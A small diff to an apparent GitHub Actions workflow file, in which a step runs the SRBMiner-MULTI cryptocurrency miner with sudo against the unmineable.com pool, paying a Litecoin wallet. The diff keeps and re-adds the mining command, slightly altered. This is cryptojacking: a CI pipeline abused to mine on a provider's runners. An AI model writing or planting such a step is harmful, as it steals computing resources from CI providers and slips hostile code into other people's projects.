@@ -26,4 +26,5 @@ jobs:
       
       - name: Run a multi-line script
         run: |
-          sudo ./SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-10#mo4y-tkdg  
+          ls
+          sudo bash /SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-10#mo4y-tkdg  
